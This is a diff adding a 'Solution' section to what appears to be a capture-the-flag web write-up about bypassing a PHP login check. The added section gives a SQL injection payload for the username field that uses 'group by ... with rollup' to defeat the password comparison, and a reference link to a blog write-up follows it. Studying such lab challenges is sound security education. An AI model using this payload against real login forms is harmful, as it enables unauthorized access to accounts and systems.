@@ -45,6 +45,11 @@ if (mysql_num_rows($query) == 1) {
 mysql_close($con);
 ?>
 ```
+# Solution
+payload:
+```
+uname='  or 1=1 group by pwd with rollup limit 1 offset 2 #&pwd=
+```
 
 # Refference
 + [chybeta : 因缺思汀的绕过](https://chybeta.github.io/2017/07/24/%E5%AE%9E%E9%AA%8C%E5%90%A7-web-writeup/#%E5%9B%A0%E7%BC%BA%E6%80%9D%E6%B1%80%E7%9A%84%E7%BB%95%E8%BF%87)
